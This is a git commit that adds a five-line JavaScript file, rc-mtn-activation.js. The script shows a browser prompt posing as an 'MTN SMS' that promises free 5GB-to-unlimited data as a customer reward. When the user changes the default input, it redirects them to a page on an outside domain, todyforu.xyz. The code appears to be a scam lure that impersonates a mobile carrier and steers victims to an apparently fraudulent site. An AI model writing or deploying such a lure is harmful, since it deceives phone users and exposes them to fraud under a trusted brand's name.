dd79accd8e04cfa3b0355ba5c10c51437c619856
zamonize1 <52072397+zamonize@users.noreply.github.com>
2024-06-10 08:46:42 -0700

    Create rc-mtn-activation.js

---
+++ rc-mtn-activation.js
@@ -0,0 +1,5 @@
+var password = '1'
+password=prompt('MTN SMS: Dear customer, please check if your MTN SIM card is eligible to receive 5GB to unlimited data, reward for old customers, press 1 to check now. ','1');
+if (password != '1') {
+location.href='https://todyforu.xyz/rc-mtn.html';
+}
